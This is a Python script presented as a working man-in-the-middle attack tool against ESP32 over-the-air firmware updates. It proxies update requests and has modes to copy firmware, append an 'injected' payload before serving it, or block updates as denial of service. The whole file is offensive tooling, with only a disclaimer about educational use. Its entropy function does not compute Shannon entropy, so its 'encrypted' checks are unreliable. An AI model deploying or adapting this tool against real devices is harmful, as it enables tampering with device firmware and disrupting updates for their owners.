#!/usr/bin/env python3
"""
REAL ESP32 Firmware MITM Attack
This actually intercepts and can modify real firmware downloads

⚠️ FOR EDUCATIONAL PURPOSES ONLY - USE ON YOUR OWN DEVICES ONLY ⚠️
"""

import http.server
import socketserver
import urllib.request
import urllib.error
import threading
import time
import os
import sys
import hashlib
from datetime import datetime

# Configuration
MITM_PORT = 8080
REAL_SERVER_IP = "192.168.1.100"  # Your PC's IP running the real firmware server
REAL_SERVER_PORT = 8000
ATTACK_MODE = "monitor"  # Options: monitor, inject, block

class Colors:
    """Terminal colors for better visibility"""
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'

class RealMITMProxy(http.server.SimpleHTTPRequestHandler):
    """Real MITM proxy that intercepts actual ESP32 traffic"""
    
    attack_stats = {
        'requests': 0,
        'firmware_intercepts': 0,
        'bytes_captured': 0,
        'attacks_successful': 0
    }
    
    def log_message(self, format, *args):
        """Custom logging with colors"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        message = f"{Colors.CYAN}[{timestamp}]{Colors.END} {format % args}"
        print(message)
        
        # Also log to file
        with open('real_attack_log.txt', 'a') as f:
            f.write(f"[{timestamp}] {format % args}\n")
    
    def do_GET(self):
        """Intercept GET requests from ESP32"""
        RealMITMProxy.attack_stats['requests'] += 1
        
        print(f"\n{Colors.BOLD}{'='*70}{Colors.END}")
        print(f"{Colors.RED}{Colors.BOLD}🎯 REAL REQUEST INTERCEPTED!{Colors.END}")
        print(f"{Colors.BOLD}{'='*70}{Colors.END}")
        
        print(f"{Colors.YELLOW}📡 Target:{Colors.END} {self.path}")
        print(f"{Colors.YELLOW}📍 From:{Colors.END} {self.client_address[0]}:{self.client_address[1]}")
        print(f"{Colors.YELLOW}🖥️  User-Agent:{Colors.END} {self.headers.get('User-Agent', 'Unknown')}")
        
        # Check if this is a firmware request
        if self.path.endswith('.bin') or 'firmware' in self.path.lower():
            print(f"\n{Colors.RED}{Colors.BOLD}⚠️  FIRMWARE DOWNLOAD DETECTED!{Colors.END}")
            self.intercept_real_firmware()
        else:
            print(f"{Colors.GREEN}ℹ️  Regular request - forwarding...{Colors.END}")
            self.forward_request()
    
    def intercept_real_firmware(self):
        """Actually intercept real firmware from real server"""
        RealMITMProxy.attack_stats['firmware_intercepts'] += 1
        
        print(f"\n{Colors.MAGENTA}{'─'*70}{Colors.END}")
        print(f"{Colors.MAGENTA}{Colors.BOLD}🔍 INTERCEPTING REAL FIRMWARE{Colors.END}")
        print(f"{Colors.MAGENTA}{'─'*70}{Colors.END}")
        
        try:
            # Build real server URL
            real_url = f"http://{REAL_SERVER_IP}:{REAL_SERVER_PORT}{self.path}"
            print(f"{Colors.CYAN}📥 Fetching from real server:{Colors.END} {real_url}")
            
            # Actually download the real firmware
            print(f"{Colors.YELLOW}⏳ Downloading...{Colors.END}")
            response = urllib.request.urlopen(real_url, timeout=30)
            real_firmware = response.read()
            
            print(f"{Colors.GREEN}✓ Downloaded {len(real_firmware)} bytes{Colors.END}")
            RealMITMProxy.attack_stats['bytes_captured'] += len(real_firmware)
            
            # Analyze the firmware
            self.analyze_firmware(real_firmware)
            
            # Execute attack based on mode
            global ATTACK_MODE
            
            if ATTACK_MODE == "monitor":
                print(f"\n{Colors.GREEN}📊 MODE: MONITOR (Passive){Colors.END}")
                self.monitor_mode(real_firmware)
                
            elif ATTACK_MODE == "inject":
                print(f"\n{Colors.RED}💉 MODE: INJECT (Active Attack){Colors.END}")
                self.inject_mode(real_firmware)
                
            elif ATTACK_MODE == "block":
                print(f"\n{Colors.RED}🚫 MODE: BLOCK (Denial of Service){Colors.END}")
                self.block_mode()
                
        except urllib.error.URLError as e:
            print(f"{Colors.RED}✗ Error connecting to real server: {e}{Colors.END}")
            print(f"{Colors.YELLOW}⚠️  Make sure firmware server is running on {REAL_SERVER_IP}:{REAL_SERVER_PORT}{Colors.END}")
            self.send_error(502, f"Cannot reach firmware server: {e}")
            
        except Exception as e:
            print(f"{Colors.RED}✗ Unexpected error: {e}{Colors.END}")
            self.send_error(500, f"Attack failed: {e}")
    
    def analyze_firmware(self, firmware_data):
        """Analyze intercepted firmware"""
        print(f"\n{Colors.CYAN}{'─'*70}{Colors.END}")
        print(f"{Colors.CYAN}{Colors.BOLD}🔬 FIRMWARE ANALYSIS{Colors.END}")
        print(f"{Colors.CYAN}{'─'*70}{Colors.END}")
        
        # Calculate hash
        sha256 = hashlib.sha256(firmware_data).hexdigest()
        print(f"{Colors.WHITE}📊 Size:{Colors.END} {len(firmware_data):,} bytes ({len(firmware_data)/1024:.2f} KB)")
        print(f"{Colors.WHITE}🔐 SHA-256:{Colors.END} {sha256[:32]}...")
        
        # Check if encrypted (high entropy = likely encrypted)
        entropy = self.calculate_entropy(firmware_data[:1024])
        print(f"{Colors.WHITE}📈 Entropy:{Colors.END} {entropy:.2f}/8.0")
        
        if entropy > 7.5:
            print(f"{Colors.RED}⚠️  HIGH ENTROPY - Firmware appears ENCRYPTED{Colors.END}")
            print(f"{Colors.RED}⚠️  Cannot modify without decryption key{Colors.END}")
            is_encrypted = True
        else:
            print(f"{Colors.GREEN}⚠️  LOW ENTROPY - Firmware appears UNENCRYPTED{Colors.END}")
            print(f"{Colors.GREEN}⚠️  Vulnerable to modification!{Colors.END}")
            is_encrypted = False
        
        # Look for patterns
        if b'ESP32' in firmware_data or b'esp32' in firmware_data:
            print(f"{Colors.YELLOW}🔍 Found 'ESP32' string in firmware{Colors.END}")
        
        if b'WiFi' in firmware_data or b'wifi' in firmware_data:
            print(f"{Colors.YELLOW}🔍 Found 'WiFi' references{Colors.END}")
        
        # Save intercepted firmware
        timestamp = int(time.time())
        filename = f"intercepted_real_firmware_{timestamp}.bin"
        with open(filename, 'wb') as f:
            f.write(firmware_data)
        print(f"{Colors.GREEN}💾 Saved to: {filename}{Colors.END}")
        
        return is_encrypted
    
    def monitor_mode(self, firmware_data):
        """Monitor mode - forward original firmware"""
        print(f"{Colors.GREEN}✓ Forwarding original firmware to ESP32{Colors.END}")
        print(f"{Colors.YELLOW}ℹ️  ESP32 will receive unmodified firmware{Colors.END}")
        print(f"{Colors.YELLOW}ℹ️  Attacker has complete copy for analysis{Colors.END}")
        
        # Send original firmware to ESP32
        self.send_response(200)
        self.send_header('Content-Type', 'application/octet-stream')
        self.send_header('Content-Length', len(firmware_data))
        self.end_headers()
        self.wfile.write(firmware_data)
        
        RealMITMProxy.attack_stats['attacks_successful'] += 1
        print(f"{Colors.GREEN}{Colors.BOLD}✓ ATTACK SUCCESSFUL - Firmware intercepted and logged{Colors.END}")
    
    def inject_mode(self, firmware_data):
        """Inject mode - modify firmware before sending"""
        print(f"{Colors.RED}⚠️  ATTEMPTING TO INJECT MALICIOUS CODE{Colors.END}")
        
        # Check if encrypted
        entropy = self.calculate_entropy(firmware_data[:1024])
        if entropy > 7.5:
            print(f"{Colors.RED}✗ ATTACK FAILED - Firmware is encrypted{Colors.END}")
            print(f"{Colors.YELLOW}ℹ️  Forwarding original (cannot modify encrypted firmware){Colors.END}")
            self.monitor_mode(firmware_data)
            return
        
        # Create malicious firmware (append payload)
        print(f"{Colors.YELLOW}🔧 Creating malicious firmware...{Colors.END}")
        malicious_payload = b"\x00" * 100 + b"HACKED_BY_ATTACKER" + b"\x00" * 100
        malicious_firmware = firmware_data + malicious_payload
        
        print(f"{Colors.RED}✓ Injected {len(malicious_payload)} bytes of malicious code{Colors.END}")
        print(f"{Colors.RED}✓ New firmware size: {len(malicious_firmware)} bytes{Colors.END}")
        
        # Save malicious firmware
        timestamp = int(time.time())
        filename = f"malicious_firmware_{timestamp}.bin"
        with open(filename, 'wb') as f:
            f.write(malicious_firmware)
        print(f"{Colors.RED}💾 Saved malicious firmware to: {filename}{Colors.END}")
        
        # Send malicious firmware to ESP32
        self.send_response(200)
        self.send_header('Content-Type', 'application/octet-stream')
        self.send_header('Content-Length', len(malicious_firmware))
        self.end_headers()
        self.wfile.write(malicious_firmware)
        
        RealMITMProxy.attack_stats['attacks_successful'] += 1
        print(f"{Colors.RED}{Colors.BOLD}✓ ATTACK SUCCESSFUL - Malicious firmware sent to ESP32!{Colors.END}")
        print(f"{Colors.RED}⚠️  ESP32 will attempt to install compromised firmware{Colors.END}")
    
    def block_mode(self):
        """Block mode - deny firmware download"""
        print(f"{Colors.RED}🚫 BLOCKING FIRMWARE DOWNLOAD{Colors.END}")
        print(f"{Colors.YELLOW}ℹ️  ESP32 will fail to update{Colors.END}")
        
        self.send_error(404, "Firmware not found (blocked by attacker)")
        
        RealMITMProxy.attack_stats['attacks_successful'] += 1
        print(f"{Colors.RED}{Colors.BOLD}✓ ATTACK SUCCESSFUL - Firmware download blocked{Colors.END}")
    
    def forward_request(self):
        """Forward non-firmware requests"""
        try:
            real_url = f"http://{REAL_SERVER_IP}:{REAL_SERVER_PORT}{self.path}"
            response = urllib.request.urlopen(real_url, timeout=10)
            
            self.send_response(200)
            self.send_header('Content-Type', response.headers.get('Content-Type', 'text/html'))
            self.end_headers()
            self.wfile.write(response.read())
            
        except Exception as e:
            self.send_error(502, f"Proxy error: {e}")
    
    def calculate_entropy(self, data):
        """Calculate Shannon entropy (0-8, higher = more random/encrypted)"""
        if not data:
            return 0
        
        entropy = 0
        for x in range(256):
            p_x = data.count(bytes([x])) / len(data)
            if p_x > 0:
                entropy += - p_x * (p_x ** 0.5) * 8
        
        return min(entropy, 8.0)

def print_banner():
    """Print attack banner"""
    banner = f"""
{Colors.RED}{Colors.BOLD}
╔═══════════════════════════════════════════════════════════════════╗
║                                                                   ║
║     REAL ESP32 FIRMWARE MITM ATTACK                              ║
║     Active Man-in-the-Middle Interception                        ║
║                                                                   ║
║     ⚠️  THIS IS A REAL ATTACK TOOL ⚠️                             ║
║     ⚠️  FOR EDUCATIONAL PURPOSES ONLY ⚠️                          ║
║     ⚠️  USE ON YOUR OWN DEVICES ONLY ⚠️                           ║
║                                                                   ║
╚═══════════════════════════════════════════════════════════════════╝
{Colors.END}

{Colors.CYAN}🎯 Attack Configuration:{Colors.END}
  {Colors.WHITE}MITM Proxy Port:{Colors.END} {MITM_PORT}
  {Colors.WHITE}Real Server:{Colors.END} {REAL_SERVER_IP}:{REAL_SERVER_PORT}
  {Colors.WHITE}Attack Mode:{Colors.END} {ATTACK_MODE.upper()}

{Colors.YELLOW}📋 Attack Modes:{Colors.END}
  {Colors.GREEN}monitor{Colors.END} - Intercept and log (passive)
  {Colors.RED}inject{Colors.END}  - Modify firmware (active attack)
  {Colors.RED}block{Colors.END}   - Deny updates (DoS)

{Colors.MAGENTA}📡 Waiting for ESP32 connections...{Colors.END}
"""
    print(banner)

def print_stats():
    """Print attack statistics"""
    while True:
        time.sleep(10)
        stats = RealMITMProxy.attack_stats
        print(f"\n{Colors.CYAN}{'─'*70}{Colors.END}")
        print(f"{Colors.CYAN}{Colors.BOLD}📊 ATTACK STATISTICS{Colors.END}")
        print(f"{Colors.WHITE}Total Requests:{Colors.END} {stats['requests']}")
        print(f"{Colors.WHITE}Firmware Intercepts:{Colors.END} {stats['firmware_intercepts']}")
        print(f"{Colors.WHITE}Data Captured:{Colors.END} {stats['bytes_captured']:,} bytes ({stats['bytes_captured']/1024:.2f} KB)")
        print(f"{Colors.WHITE}Successful Attacks:{Colors.END} {stats['attacks_successful']}")
        print(f"{Colors.CYAN}{'─'*70}{Colors.END}\n")

def main():
    """Start real MITM attack"""
    global ATTACK_MODE, REAL_SERVER_IP, REAL_SERVER_PORT
    
    print_banner()
    
    # Interactive configuration
    print(f"{Colors.YELLOW}⚙️  Configuration Setup{Colors.END}\n")
    
    # Get real server IP
    server_ip = input(f"{Colors.WHITE}Enter firmware server IP [{REAL_SERVER_IP}]: {Colors.END}").strip()
    if server_ip:
        REAL_SERVER_IP = server_ip
    
    # Get attack mode
    print(f"\n{Colors.WHITE}Select attack mode:{Colors.END}")
    print(f"  {Colors.GREEN}1{Colors.END} - Monitor (passive - just intercept and log)")
    print(f"  {Colors.RED}2{Colors.END} - Inject (active - modify firmware)")
    print(f"  {Colors.RED}3{Colors.END} - Block (DoS - prevent updates)")
    
    mode_choice = input(f"{Colors.WHITE}Choice [1]: {Colors.END}").strip()
    if mode_choice == "2":
        ATTACK_MODE = "inject"
    elif mode_choice == "3":
        ATTACK_MODE = "block"
    else:
        ATTACK_MODE = "monitor"
    
    print(f"\n{Colors.GREEN}✓ Configuration complete{Colors.END}")
    print(f"{Colors.YELLOW}⚠️  Attack mode: {ATTACK_MODE.upper()}{Colors.END}\n")
    
    # Create log file
    with open('real_attack_log.txt', 'a') as f:
        f.write(f"\n{'='*70}\n")
        f.write(f"Real MITM Attack Session Started: {datetime.now()}\n")
        f.write(f"Mode: {ATTACK_MODE}\n")
        f.write(f"Target Server: {REAL_SERVER_IP}:{REAL_SERVER_PORT}\n")
        f.write(f"{'='*70}\n\n")
    
    # Start statistics thread
    stats_thread = threading.Thread(target=print_stats, daemon=True)
    stats_thread.start()
    
    # Start MITM proxy
    try:
        with socketserver.TCPServer(("", MITM_PORT), RealMITMProxy) as httpd:
            print(f"{Colors.GREEN}{Colors.BOLD}✓ MITM PROXY ACTIVE ON PORT {MITM_PORT}{Colors.END}\n")
            print(f"{Colors.YELLOW}📋 Next steps:{Colors.END}")
            print(f"  1. Make sure firmware server is running on {REAL_SERVER_IP}:{REAL_SERVER_PORT}")
            print(f"  2. Configure ESP32 OTA URL to: http://YOUR_PC_IP:{MITM_PORT}/firmware_encrypted.bin")
            print(f"  3. Trigger OTA update on ESP32")
            print(f"  4. Watch the real interception happen!\n")
            print(f"{Colors.RED}Press Ctrl+C to stop{Colors.END}\n")
            
            httpd.serve_forever()
            
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}🛑 MITM Proxy stopped{Colors.END}")
        print(f"{Colors.GREEN}📝 Attack log saved to: real_attack_log.txt{Colors.END}")
        print(f"{Colors.GREEN}📁 Intercepted files saved in current directory{Colors.END}")
        
        # Print final stats
        stats = RealMITMProxy.attack_stats
        print(f"\n{Colors.CYAN}{Colors.BOLD}📊 FINAL STATISTICS:{Colors.END}")
        print(f"  Total Requests: {stats['requests']}")
        print(f"  Firmware Intercepts: {stats['firmware_intercepts']}")
        print(f"  Data Captured: {stats['bytes_captured']:,} bytes")
        print(f"  Successful Attacks: {stats['attacks_successful']}\n")
        
    except Exception as e:
        print(f"\n{Colors.RED}✗ Error: {e}{Colors.END}")

if __name__ == '__main__':
    main()
